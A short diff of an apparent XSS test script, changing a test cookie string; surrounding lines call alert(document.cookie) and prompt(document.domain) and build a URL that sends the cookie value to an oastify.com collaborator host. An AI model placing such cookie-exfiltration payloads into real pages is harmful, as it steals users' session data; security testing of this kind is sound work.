@@ -4,7 +4,7 @@ prompt("3. xss through prompt")
 alert(document.cookie)
 prompt(document.domain)
 
-const cookieValue = "TestcookieValue";
+const cookieValue = "TestcookieValueGithub";
 
 const url = `http://fraqiqv4hfz631dzya9ae5dkvb11pq.oastify.com?cookie=${cookieValue}`;
 
